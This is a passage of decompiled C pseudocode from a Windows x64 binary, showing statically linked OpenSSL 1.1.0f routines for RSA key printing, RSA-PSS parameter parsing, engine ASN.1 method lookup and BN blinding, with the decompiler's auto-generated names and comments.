    sub_140067440(a5, (__int64)v11, 16, v10);
  }
  v12 = sub_14002C0F0(0x390u);
  sub_140067440(a4, (__int64)v12, 16, v9);
  return 3i64;
}
// 14004C630: using guessed type int var_18[6];

//----- (000000014004C740) ----------------------------------------------------
__int64 __fastcall sub_14004C740(__int64 a1, __int64 *a2, int a3, int a4)
{
  unsigned int v4; // r14d
  __int64 v6; // rcx
  unsigned int v10; // ebp
  const char *v11; // rdx
  const char *v12; // rbp

  v4 = 0;
  v6 = a2[3];
  v10 = 0;
  if ( v6 )
    v10 = sub_140027260(v6);
  if ( (unsigned int)sub_140029E80(a1, a3, 128) )
  {
    if ( a4 && a2[5] )
    {
      if ( (int)sub_14002A590(a1, "Private-Key: (%d bit)\n", v10) <= 0 )
        return v4;
      v11 = "modulus:";
      v12 = "publicExponent:";
    }
    else
    {
      if ( (int)sub_14002A590(a1, "Public-Key: (%d bit)\n", v10) <= 0 )
        return v4;
      v11 = "Modulus:";
      v12 = "Exponent:";
    }
    if ( (unsigned int)sub_1400670C0(a1, v11, a2[3], 0i64, a3)
      && (unsigned int)sub_1400670C0(a1, v12, a2[4], 0i64, a3)
      && (!a4
       || (unsigned int)sub_1400670C0(a1, "privateExponent:", a2[5], 0i64, a3)
       && (unsigned int)sub_1400670C0(a1, "prime1:", a2[6], 0i64, a3)
       && (unsigned int)sub_1400670C0(a1, "prime2:", a2[7], 0i64, a3)
       && (unsigned int)sub_1400670C0(a1, "exponent1:", a2[8], 0i64, a3)
       && (unsigned int)sub_1400670C0(a1, "exponent2:", a2[9], 0i64, a3)
       && (unsigned int)sub_1400670C0(a1, "coefficient:", a2[10], 0i64, a3)) )
    {
      return 1;
    }
  }
  return v4;
}

//----- (000000014004C920) ----------------------------------------------------
void *__fastcall sub_14004C920(__int64 *a1)
{
  unsigned int v2; // eax
  char *v3; // rax
  __int64 v4; // rbx

  if ( !a1 )
    return sub_14005BAC0();
  v2 = sub_14002C260(*a1);
  v3 = sub_14002C1A0(v2);
  v4 = sub_14001E990((__int64)v3);
  if ( !v4 )
    sub_140024610(4, 156, 166, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 409);
  return (void *)v4;
}

//----- (000000014004C990) ----------------------------------------------------
__int64 __fastcall sub_14004C990(__int64 a1)
{
  unsigned int v2; // edi
  __int64 v3; // r13
  __int64 result; // rax
  __int64 *v5; // rbp
  int v6; // eax
  __int64 v7; // rsi
  void *v8; // rax
  __int64 v9; // rax
  __int64 v10; // rbx
  void *v11; // rax
  void *v12; // r12
  void *v13; // r15
  __int64 *v14; // r14
  __int64 v15; // rax
  __int64 v16; // rax
  unsigned int v17; // r14d
  __int64 *v18; // [rsp+80h] [rbp+18h] BYREF

  v2 = -1;
  v3 = 0i64;
  result = sub_14007E6B0(a1);
  v5 = (__int64 *)result;
  if ( result )
  {
    if ( !(unsigned int)sub_14007E6D0(a1, 0i64, 0i64, &v18) )
      return v2;
    v6 = sub_14002C260(*v18);
    if ( v6 == 6 )
      return 1i64;
    if ( v6 != 919 )
    {
      sub_140024610(4, 159, 162, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 715);
      return 0xFFFFFFFFi64;
    }
    v7 = 0i64;
    v8 = sub_140080C40();
    v9 = sub_14003F490((__int64)v8, v18[1]);
    v10 = v9;
    if ( !v9 )
    {
      sub_140024610(4, 159, 161, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 722);
LABEL_27:
      sub_140080C20((unsigned int *)v10);
      sub_1400673C0((unsigned int *)v7);
      return v2;
    }
    v7 = *(_QWORD *)(v9 + 8);
    if ( v7 )
    {
      if ( (unsigned int)sub_14002C260(*(_QWORD *)v7) == 911 )
      {
        v11 = sub_1400673B0();
        v7 = sub_14003F490((__int64)v11, *(_QWORD *)(v7 + 8));
      }
      else
      {
        v7 = 0i64;
      }
    }
    v12 = sub_14004D360(*(__int64 **)(v10 + 8), (__int64 *)v7);
    if ( !v12 )
      goto LABEL_27;
    v13 = sub_14004C920(*(__int64 **)v10);
    if ( !v13 )
      goto LABEL_27;
    v14 = *(__int64 **)(v10 + 16);
    if ( v14 )
    {
      if ( (unsigned int)sub_14002C260(*v14) != 935 )
      {
        sub_140024610(4, 159, 163, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 736);
        goto LABEL_27;
      }
      v15 = v14[1];
      if ( *(_DWORD *)v15 != 4 )
      {
        sub_140024610(4, 159, 160, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 740);
        goto LABEL_27;
      }
      v16 = *(_QWORD *)(v15 + 8);
      v3 = *(_QWORD *)(v16 + 8);
      *(_QWORD *)(v16 + 8) = 0i64;
      v17 = **(_DWORD **)(v14[1] + 8);
    }
    else
    {
      v17 = 0;
    }
    if ( (int)sub_140020440(v5, 6, -1, 0x1001u, 4u, 0i64) > 0
      && (int)sub_140020440(v5, 6, 768, 0x1009u, 0, (__int64)v13) > 0
      && (int)sub_140020440(v5, 6, 1016, 0x1005u, 0, (__int64)v12) > 0
      && (int)sub_140020440(v5, 6, 768, 0x100Au, v17, v3) > 0 )
    {
      v2 = 1;
    }
    goto LABEL_27;
  }
  return result;
}

//----- (000000014004CC60) ----------------------------------------------------
__int64 __fastcall sub_14004CC60(__int64 a1)
{
  unsigned int v1; // esi
  __int64 *v3; // rdi
  __int64 v4; // rax
  __int64 *v5; // rbp
  char **v7; // rax
  int v8; // ebp
  __int64 *v9; // rax
  __int64 v10; // rax
  _DWORD *v11; // rax
  __int64 v12; // rbx
  char **v13; // rax
  void *v14; // rax
  char **v15; // rax
  unsigned int *v16; // [rsp+30h] [rbp-38h] BYREF
  unsigned int *v17; // [rsp+38h] [rbp-30h] BYREF
  _BYTE *v18; // [rsp+40h] [rbp-28h] BYREF
  int v19; // [rsp+78h] [rbp+10h] BYREF
  _DWORD *v20; // [rsp+80h] [rbp+18h] BYREF
  __int64 *v21; // [rsp+88h] [rbp+20h] BYREF

  v1 = 0;
  v3 = 0i64;
  v20 = 0i64;
  v4 = sub_14007E6B0(a1);
  v19 = 1;
  v5 = (__int64 *)v4;
  sub_14007E6D0(a1, 0i64, 0i64, &v21);
  if ( v5 && (int)sub_140020440(v5, 6, -1, 0x1006u, 0, (__int64)&v19) <= 0 )
    return 0i64;
  if ( v19 == 1 )
  {
    v7 = sub_14002C0F0(6u);
    sub_140067440(v21, (__int64)v7, 5, 0i64);
    return 1i64;
  }
  if ( v19 != 4 )
    return 0i64;
  if ( (int)sub_140020440(v5, 6, 768, 0x100Bu, 0, (__int64)&v16) > 0
    && (int)sub_140020440(v5, 6, 1016, 0x1008u, 0, (__int64)&v17) > 0 )
  {
    v8 = sub_140020440(v5, 6, 768, 0x100Cu, 0, (__int64)&v18);
    if ( v8 >= 0 )
    {
      v9 = (__int64 *)sub_140080C50();
      v3 = v9;
      if ( v9 )
      {
        if ( (unsigned int)sub_14004D210(v9, v16) && (unsigned int)sub_14004D270((__int64 **)v3 + 1, v17) )
        {
          if ( v8 > 0 )
          {
            v10 = sub_140067420();
            v3[2] = v10;
            if ( !v10 )
              goto LABEL_21;
            v11 = sub_14004FEE0();
            v12 = (__int64)v11;
            if ( !v11 )
              goto LABEL_21;
            if ( !(unsigned int)sub_14006B0A0((__int64)v11, v18, v8) )
            {
              sub_14004FD70(v12);
              goto LABEL_21;
            }
            v13 = sub_14002C0F0(0x3A7u);
            sub_140067440((__int64 *)v3[2], (__int64)v13, 4, v12);
          }
          v14 = sub_140080C40();
          if ( sub_1400755F0((unsigned int *)v3, (__int64)v14, &v20) )
          {
            v15 = sub_14002C0F0(0x397u);
            sub_140067440(v21, (__int64)v15, 16, (__int64)v20);
            v20 = 0i64;
            v1 = 1;
          }
        }
      }
    }
  }
LABEL_21:
  sub_140080C20((unsigned int *)v3);
  sub_140047500((__int64)v20);
  return v1;
}

//----- (000000014004CED0) ----------------------------------------------------
__int64 __fastcall sub_14004CED0(_QWORD *a1)
{
  __int64 *v2; // rdi
  char **v4; // rax
  __int64 v5; // r9
  int v6; // r8d
  _DWORD *v7; // rbx
  int v8; // [rsp+48h] [rbp+10h] BYREF
  __int64 *v9; // [rsp+50h] [rbp+18h] BYREF

  v8 = 1;
  v2 = (__int64 *)sub_14007F5A0((__int64)a1);
  sub_14007F560(a1, 0i64, 0i64, 0i64, &v9);
  if ( v2 && (int)sub_140020440(v2, 6, -1, 0x1006u, 0, (__int64)&v8) <= 0 )
    return 0i64;
  if ( v8 == 1 )
  {
    v4 = sub_14002C0F0(6u);
    v5 = 0i64;
    v6 = 5;
  }
  else
  {
    if ( v8 != 6 )
      return 0i64;
    v7 = sub_14004D060(v2);
    if ( !v7 )
      return 0i64;
    v4 = sub_14002C0F0(0x390u);
    v5 = (__int64)v7;
    v6 = 16;
  }
  sub_140067440(v9, (__int64)v4, v6, v5);
  return 1i64;
}

//----- (000000014004CFB0) ----------------------------------------------------
__int64 __fastcall sub_14004CFB0(_QWORD *a1)
{
  __int64 *v2; // rdi
  int v3; // eax
  int v5; // [rsp+48h] [rbp+10h] BYREF
  __int64 *v6; // [rsp+50h] [rbp+18h] BYREF

  v2 = (__int64 *)sub_14007F5A0((__int64)a1);
  sub_14007F560(a1, 0i64, 0i64, 0i64, &v6);
  v3 = sub_14002C260(*v6);
  if ( v3 == 6 )
    return 1i64;
  if ( v3 == 912 )
    return sub_14004D650(0i64, v2, v6, 0i64);
  return (unsigned int)sub_140035DA0(v3, 0i64, &v5) && v5 == 6;
}

//----- (000000014004D060) ----------------------------------------------------
_DWORD *__fastcall sub_14004D060(__int64 *a1)
{
  __int64 v1; // rbx
  __int64 jumpbuf_sp; // rbp
  int v4; // edi
  int v5; // ebx
  _DWORD *v6; // rax
  void *v7; // rax
  unsigned int *v9; // [rsp+30h] [rbp-28h] BYREF
  int v10; // [rsp+68h] [rbp+10h] BYREF
  unsigned int *v11; // [rsp+70h] [rbp+18h] BYREF
  _DWORD *v12; // [rsp+78h] [rbp+20h] BYREF

  v1 = 0i64;
  v12 = 0i64;
  jumpbuf_sp = _except_get_jumpbuf_sp(a1);
  v4 = 0;
  if ( (int)sub_140020440(a1, -1, 248, 0xDu, 0, (__int64)&v11) > 0
    && (int)sub_140020440(a1, 6, 1016, 0x1008u, 0, (__int64)&v9) > 0
    && (unsigned int)sub_140020440(a1, 6, 24, 0x1007u, 0, (__int64)&v10) )
  {
    if ( v10 == -1 )
    {
      v10 = sub_1400253D0((__int64)v11);
    }
    else if ( v10 == -2 )
    {
      v5 = -2 - sub_1400253D0((__int64)v11);
      v10 = v5 + sub_14001D700(jumpbuf_sp);
      if ( (((unsigned __int8)sub_14001D200(jumpbuf_sp) - 1) & 7) == 0 )
        --v10;
    }
    v1 = sub_140080CA0();
    if ( v1 )
    {
      if ( v10 == 20
        || (v6 = sub_14004FE60(), (*(_QWORD *)(v1 + 16) = v6) != 0i64) && (unsigned int)sub_14007DA60((__int64)v6, v10) )
      {
        if ( (unsigned int)sub_14004D210((__int64 *)v1, v11) )
        {
          if ( (unsigned int)sub_14004D270((__int64 **)(v1 + 8), v9) )
          {
            v7 = sub_140080C90();
            if ( sub_1400755F0((unsigned int *)v1, (__int64)v7, &v12) )
              v4 = 1;
          }
        }
      }
    }
  }
  sub_140080C70((unsigned int *)v1);
  if ( v4 )
    return v12;
  sub_140047500((__int64)v12);
  return 0i64;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (000000014004D210) ----------------------------------------------------
__int64 __fastcall sub_14004D210(__int64 *a1, unsigned int *a2)
{
  __int64 result; // rax

  if ( (unsigned int)sub_14001D4F0(a2) != 64 )
  {
    result = sub_140067420();
    *a1 = result;
    if ( !result )
      return result;
    sub_1400674E0((__int64 *)result, (__int64)a2);
  }
  return 1i64;
}

//----- (000000014004D270) ----------------------------------------------------
__int64 __fastcall sub_14004D270(__int64 **a1, unsigned int *a2)
{
  unsigned int v2; // edi
  unsigned int *v5; // rbx
  __int64 *v7; // rax
  void *v8; // rax
  __int64 v9; // rax
  char **v10; // rax
  _DWORD *v11; // rcx
  _DWORD *v12; // [rsp+30h] [rbp+8h] BYREF

  v2 = 0;
  *a1 = 0i64;
  v12 = 0i64;
  v5 = 0i64;
  if ( (unsigned int)sub_14001D4F0(a2) == 64 )
    return 1i64;
  if ( (unsigned int)sub_14001D4F0(a2) != 64 )
  {
    v7 = (__int64 *)sub_140067420();
    v5 = (unsigned int *)v7;
    if ( !v7 )
    {
LABEL_9:
      v11 = v12;
      goto LABEL_10;
    }
    sub_1400674E0(v7, (__int64)a2);
  }
  v8 = sub_1400673B0();
  if ( !sub_1400755F0(v5, (__int64)v8, &v12) )
    goto LABEL_9;
  v9 = sub_140067420();
  *a1 = (__int64 *)v9;
  if ( !v9 )
    goto LABEL_9;
  v10 = sub_14002C0F0(0x38Fu);
  sub_140067440(*a1, (__int64)v10, 16, (__int64)v12);
  v11 = 0i64;
  v12 = 0i64;
LABEL_10:
  sub_140047500((__int64)v11);
  sub_1400673C0(v5);
  LOBYTE(v2) = *a1 != 0i64;
  return v2;
}

//----- (000000014004D360) ----------------------------------------------------
void *__fastcall sub_14004D360(__int64 *a1, __int64 *a2)
{
  void *result; // rax
  unsigned int v4; // eax
  char *v5; // rax

  if ( !a1 )
    return sub_14005BAC0();
  if ( (unsigned int)sub_14002C260(*a1) == 911 )
  {
    if ( a2 )
    {
      v4 = sub_14002C260(*a2);
      v5 = sub_14002C1A0(v4);
      result = (void *)sub_14001E990((__int64)v5);
      if ( result )
        return result;
      sub_140024610(4, 157, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 430);
    }
    else
    {
      sub_140024610(4, 157, 154, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 425);
    }
  }
  else
  {
    sub_140024610(4, 157, 153, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 421);
  }
  return 0i64;
}

//----- (000000014004D400) ----------------------------------------------------
__int64 __fastcall sub_14004D400(__int64 a1, __int64 a2, __int64 *a3, int a4)
{
  unsigned int v4; // esi
  int v9; // eax
  __int64 *v10; // rdx
  __int64 v11; // rcx
  int v12; // eax
  const char *v13; // rdx
  __int64 v14; // rdx
  int v15; // eax
  __int64 v16; // rdx
  int v17; // eax

  v4 = 0;
  if ( !a2 )
  {
    LOBYTE(v4) = (int)sub_14002A1A0(a1, (__int64)" (INVALID PSS PARAMETERS)\n") > 0;
    return v4;
  }
  if ( (int)sub_14002A1A0(a1, (__int64)"\n") > 0
    && (unsigned int)sub_140029E80(a1, a4, 128)
    && (int)sub_14002A1A0(a1, (__int64)"Hash Algorithm: ") > 0 )
  {
    v9 = *(_QWORD *)a2 ? sub_14003FD20(a1, **(_QWORD **)a2) : sub_14002A1A0(a1, (__int64)"sha1 (default)");
    if ( v9 > 0
      && (int)sub_14002A1A0(a1, (__int64)"\n") > 0
      && (unsigned int)sub_140029E80(a1, a4, 128)
      && (int)sub_14002A1A0(a1, (__int64)"Mask Algorithm: ") > 0 )
    {
      v10 = *(__int64 **)(a2 + 8);
      v11 = a1;
      if ( v10 )
      {
        if ( (int)sub_14003FD20(a1, *v10) <= 0 || (int)sub_14002A1A0(a1, (__int64)" with ") <= 0 )
          return v4;
        v11 = a1;
        if ( a3 )
        {
          v12 = sub_14003FD20(a1, *a3);
          goto LABEL_21;
        }
        v13 = "INVALID";
      }
      else
      {
        v13 = "mgf1 with sha1 (default)";
      }
      v12 = sub_14002A1A0(v11, (__int64)v13);
LABEL_21:
      if ( v12 > 0 )
      {
        sub_14002A1A0(a1, (__int64)"\n");
        if ( (unsigned int)sub_140029E80(a1, a4, 128) )
        {
          if ( (int)sub_14002A1A0(a1, (__int64)"Salt Length: 0x") > 0 )
          {
            v14 = *(_QWORD *)(a2 + 16);
            v15 = v14 ? sub_140080A80(a1, v14) : sub_14002A1A0(a1, (__int64)"14 (default)");
            if ( v15 > 0 )
            {
              sub_14002A1A0(a1, (__int64)"\n");
              if ( (unsigned int)sub_140029E80(a1, a4, 128) )
              {
                if ( (int)sub_14002A1A0(a1, (__int64)"Trailer Field: 0x") > 0 )
                {
                  v16 = *(_QWORD *)(a2 + 24);
                  if ( v16 )
                    v17 = sub_140080A80(a1, v16);
                  else
                    v17 = sub_14002A1A0(a1, (__int64)"BC (default)");
                  if ( v17 > 0 )
                  {
                    sub_14002A1A0(a1, (__int64)"\n");
                    return 1;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return v4;
}

//----- (000000014004D650) ----------------------------------------------------
__int64 __fastcall sub_14004D650(__int64 a1, __int64 *a2, __int64 *a3, __int64 a4)
{
  unsigned int v6; // esi
  __int64 *v8; // rbp
  void *v9; // rax
  __int64 v10; // rax
  __int64 v11; // rdi
  __int64 *v12; // rbx
  void *v13; // rax
  void *v14; // r13
  int *v15; // r15
  int *v16; // rcx
  signed int v17; // r14d
  int *v18; // rcx
  int v19; // ebx
  __int64 *v21; // [rsp+78h] [rbp+10h] BYREF
  unsigned int *v22; // [rsp+80h] [rbp+18h] BYREF

  v21 = a2;
  v6 = -1;
  if ( (unsigned int)sub_14002C260(*a3) != 912 )
  {
    sub_140024610(4, 155, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 503);
    return 0xFFFFFFFFi64;
  }
  v8 = 0i64;
  v9 = sub_140080C90();
  v10 = sub_14003F490((__int64)v9, a3[1]);
  v11 = v10;
  if ( v10 )
  {
    v12 = *(__int64 **)(v10 + 8);
    if ( v12 && (unsigned int)sub_14002C260(*v12) == 911 )
    {
      v13 = sub_1400673B0();
      v8 = (__int64 *)sub_14003F490((__int64)v13, v12[1]);
    }
    v14 = sub_14004D360(*(__int64 **)(v11 + 8), v8);
    if ( !v14 )
      goto LABEL_23;
    v15 = (int *)sub_14004C920(*(__int64 **)v11);
    if ( !v15 )
      goto LABEL_23;
    v16 = *(int **)(v11 + 16);
    if ( v16 )
    {
      v17 = sub_14007D9A0(v16);
      if ( v17 < 0 )
      {
        sub_140024610(4, 155, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 528);
        goto LABEL_23;
      }
    }
    else
    {
      v17 = 20;
    }
    v18 = *(int **)(v11 + 24);
    if ( !v18 || (unsigned int)sub_14007D9A0(v18) == 1 )
    {
      if ( a4 )
      {
        if ( !(unsigned int)sub_14006E3F0(a1, &v21, v15, 0i64, a4) )
          goto LABEL_23;
      }
      else
      {
        if ( (int)sub_140020440(v21, -1, 248, 0xDu, 0, (__int64)&v22) <= 0 )
          goto LABEL_23;
        v19 = sub_14001D4F0(v22);
        if ( (unsigned int)sub_14001D4F0((unsigned int *)v15) != v19 )
        {
          sub_140024610(4, 155, 158, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 553);
          goto LABEL_23;
        }
      }
      if ( (int)sub_140020440(v21, 6, -1, 0x1001u, 6u, 0i64) > 0
        && (int)sub_140020440(v21, 6, 24, 0x1002u, v17, 0i64) > 0
        && (int)sub_140020440(v21, 6, 1016, 0x1005u, 0, (__int64)v14) > 0 )
      {
        v6 = 1;
      }
      goto LABEL_23;
    }
    sub_140024610(4, 155, 139, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 539);
  }
  else
  {
    sub_140024610(4, 155, 149, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 510);
  }
LABEL_23:
  sub_140080C70((unsigned int *)v11);
  sub_1400673C0((unsigned int *)v8);
  return v6;
}

//----- (000000014004D940) ----------------------------------------------------
__int64 __fastcall sub_14004D940(__int64 a1, unsigned int a2)
{
  unsigned int (__fastcall *v2)(__int64, __int64 *, _QWORD, _QWORD); // rax
  __int64 v4; // [rsp+40h] [rbp+8h] BYREF

  v2 = *(unsigned int (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(a1 + 80);
  if ( v2 && v2(a1, &v4, 0i64, a2) )
    return v4;
  sub_140024610(38, 193, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\tb_asnmth.c", 88);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014004D9A0) ----------------------------------------------------
__int64 __fastcall sub_14004D9A0(int a1)
{
  return sub_1400417E0(&qword_140143368, a1);
}
// 140143368: using guessed type __int64 qword_140143368;

//----- (000000014004D9C0) ----------------------------------------------------
__int64 __fastcall sub_14004D9C0(_QWORD *a1, __int64 a2, int a3)
{
  int v4; // eax
  int v5; // edx
  __int64 v7; // rax
  __int128 v8; // [rsp+30h] [rbp-28h] BYREF
  __int64 v9; // [rsp+40h] [rbp-18h]
  int v10; // [rsp+48h] [rbp-10h]

  v9 = a2;
  v10 = a3;
  v8 = 0i64;
  v4 = sub_140025C90(&dword_140142C34, (void (*)(void))sub_140034C60);
  v5 = 0;
  if ( v4 )
    v5 = dword_140142C38;
  if ( v5 )
  {
    sub_140025D20((_DWORD *)qword_140147E80);
    sub_1400415E0(qword_140143368, (__int64)sub_14004DBA0, (__int64)&v8);
    v7 = v8;
    if ( (_QWORD)v8 )
    {
      ++*(_DWORD *)(v8 + 156);
      v7 = v8;
    }
    *a1 = v7;
    sub_140025CE0((_DWORD *)qword_140147E80);
    return *((_QWORD *)&v8 + 1);
  }
  else
  {
    sub_140024610(38, 197, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\tb_asnmth.c", 193);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C34: using guessed type _DWORD dword_140142C34;
// 140142C38: using guessed type int dword_140142C38;
// 140143368: using guessed type __int64 qword_140143368;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (000000014004DA90) ----------------------------------------------------
__int64 __fastcall sub_14004DA90(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 80);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_140143368, (__int64)sub_14004DB80, a1, v5, v3, 1);
  else
    return 1i64;
}
// 140143368: using guessed type __int64 qword_140143368;

//----- (000000014004DB00) ----------------------------------------------------
void __fastcall sub_14004DB00(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, __int64 *, _QWORD); // rax
  int v3; // eax
  __int64 v4; // rbx
  __int64 i; // rsi
  __int64 v6; // [rsp+30h] [rbp+8h] BYREF
  __int64 v7; // [rsp+38h] [rbp+10h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, __int64 *, _QWORD))(a1 + 80);
  if ( v1 )
  {
    v3 = v1(a1, 0i64, &v6, 0i64);
    v4 = 0i64;
    for ( i = v3; v4 < i; ++v4 )
    {
      if ( (*(unsigned int (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(a1 + 80))(
             a1,
             &v7,
             0i64,
             *(unsigned int *)(v6 + 4 * v4)) )
      {
        sub_14002CE80(v7);
      }
    }
  }
}

//----- (000000014004DB80) ----------------------------------------------------
__int64 sub_14004DB80()
{
  return sub_140041580(&qword_140143368);
}
// 140143368: using guessed type __int64 qword_140143368;

//----- (000000014004DBA0) ----------------------------------------------------
void __fastcall sub_14004DBA0(unsigned int a1, unsigned int *a2, __int64 a3, __int64 a4)
{
  int v7; // ebx
  __int64 v8; // rbp
  unsigned int v9; // edx
  const char *v10; // rcx
  const char *i; // r8
  __int64 v12; // [rsp+58h] [rbp+20h] BYREF

  if ( !*(_QWORD *)(a4 + 8) )
  {
    v7 = 0;
    if ( (int)sub_1400296E0(a2) > 0 )
    {
      while ( 1 )
      {
        v8 = sub_140029880((__int64)a2, v7);
        (*(void (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(v8 + 80))(v8, &v12, 0i64, a1);
        v9 = 0;
        v10 = *(const char **)(v12 + 16);
        for ( i = v10; *i; ++v9 )
        {
          if ( v9 >= 0x80000000 )
            break;
          ++i;
        }
        if ( (v9 & 0x7FFFFFFF) == *(_DWORD *)(a4 + 24) && !strnicmp(v10, *(const char **)(a4 + 16), *(int *)(a4 + 24)) )
          break;
        if ( ++v7 >= (int)sub_1400296E0(a2) )
          return;
      }
      *(_QWORD *)(a4 + 8) = v12;
      *(_QWORD *)a4 = v8;
    }
  }
}

//----- (000000014004DC70) ----------------------------------------------------
__int64 __fastcall sub_14004DC70(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // eax
  unsigned int v5; // edi
  __int64 result; // rax

  v5 = v4 - 47;
  if ( !*(_QWORD *)a3 || !*(_QWORD *)(a3 + 8) )
  {
    sub_140024610(3, 100, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_blind.c", 137);
    return 0i64;
  }
  if ( *(_DWORD *)(a3 + 36) == -1 )
  {
    *(_DWORD *)(a3 + 36) = 0;
  }
  else
  {
    result = sub_14004E1A0(a3, a4);
    if ( !(_DWORD)result )
      return result;
  }
  if ( a2 && !sub_140026E90(a2, *(_QWORD *)(a3 + 8)) )
    v5 = 0;
  if ( !(unsigned int)sub_140079710(a1, a1, *(_QWORD *)a3, *(_QWORD *)(a3 + 24), a4) )
    return 0;
  return v5;
}
// 14004DC8F: variable 'v4' is possibly undefined

//----- (000000014004DD40) ----------------------------------------------------
__int64 *__fastcall sub_14004DD40(__int64 *a1, __int64 a2, __int64 a3, int *a4, __int64 a5, __int64 a6)
{
  int v6; // eax
  int v7; // edi
  __int64 *v11; // rbx
  _DWORD *v12; // rax
  _DWORD *v13; // rax
  __int64 (__fastcall *v15)(__int64, __int64, __int64, __int64, int *, __int64); // rax
  int v16; // eax
  int v18; // [rsp+50h] [rbp+8h] BYREF

  v7 = v6 - 16;
  if ( a1 )
    v11 = a1;
  else
    v11 = sub_14004E020(0i64, 0i64, a3);
  if ( !v11 )
    goto LABEL_28;
  if ( !*v11 )
  {
    v12 = sub_140027200();
    *v11 = (__int64)v12;
    if ( !v12 )
      goto LABEL_28;
  }
  if ( !v11[1] )
  {
    v13 = sub_140027200();
    v11[1] = (__int64)v13;
    if ( !v13 )
      goto LABEL_28;
  }
  if ( a2 )
  {
    sub_140026FF0((_DWORD *)v11[2]);
    v11[2] = (__int64)sub_140026F70(a2);
  }
  if ( !v11[2] )
    goto LABEL_28;
  if ( a5 )
    v11[7] = a5;
  if ( a6 )
    v11[6] = a6;
  if ( !(unsigned int)sub_140028310(*v11, v11[3]) )
    goto LABEL_28;
  while ( !sub_140070220((_DWORD *)v11[1], *v11, (__int64 *)v11[3], a4, &v18) )
  {
    if ( !v18 )
      goto LABEL_28;
    if ( !v7-- )
    {
      sub_140024610(3, 128, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_blind.c", 263);
      goto LABEL_28;
    }
    if ( !(unsigned int)sub_140028310(*v11, v11[3]) )
      goto LABEL_28;
  }
  v15 = (__int64 (__fastcall *)(__int64, __int64, __int64, __int64, int *, __int64))v11[7];
  if ( v15 && v11[6] )
    v16 = v15(*v11, *v11, v11[2], v11[3], a4, v11[6]);
  else
    v16 = sub_14007BD10((_QWORD *)*v11, *v11, v11[2], v11[3], a4);
  if ( !v16 )
  {
LABEL_28:
    if ( !a1 )
    {
      sub_14004DEF0((_DWORD **)v11);
      return 0i64;
    }
  }
  return v11;
}
// 14004DD5B: variable 'v6' is possibly undefined

//----- (000000014004DEF0) ----------------------------------------------------
void __fastcall sub_14004DEF0(_DWORD **a1)
{
  if ( a1 )
  {
    sub_140026FF0(*a1);
    sub_140026FF0(a1[1]);
    sub_140026FF0(a1[2]);
    sub_140026FF0(a1[3]);
    sub_140025BE0(a1[8]);
    sub_14001D930(a1);
  }
}

//----- (000000014004DF50) ----------------------------------------------------
__int64 __fastcall sub_14004DF50(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  __int64 v5; // rax

  if ( a2 )
    return sub_140079710(a1, a1, a2, *(_QWORD *)(a3 + 24), a4);
  v5 = *(_QWORD *)(a3 + 8);
  if ( v5 )
    return sub_140079710(a1, a1, v5, *(_QWORD *)(a3 + 24), a4);
  sub_140024610(3, 101, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_blind.c", 174);
  return 0i64;
}

//----- (000000014004DFD0) ----------------------------------------------------
_BOOL8 __fastcall sub_14004DFD0(__int64 a1)
{
  int v2; // eax

  v2 = UserMathErrorFunction((struct _exception *)a1);
  return sub_140025B70(v2, *(_DWORD *)(a1 + 32));
}

//----- (000000014004E000) ----------------------------------------------------
__int64 __fastcall sub_14004E000(__int64 a1)
{
  return sub_140025D20(*(_DWORD **)(a1 + 64));
}

//----- (000000014004E020) ----------------------------------------------------
_QWORD *__fastcall sub_14004E020(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // eax
  _QWORD *v7; // rbx
  _DWORD *v9; // rax
  struct _exception *v10; // rcx
  _DWORD *v11; // rax
  _DWORD *v12; // rax
  _DWORD *v13; // rax

  v7 = sub_14001DC20((unsigned int)(v3 + 24));
  if ( v7 )
  {
    v9 = sub_140025C10();
    v7[8] = v9;
    if ( v9 )
    {
      *((_DWORD *)v7 + 8) = UserMathErrorFunction(v10);
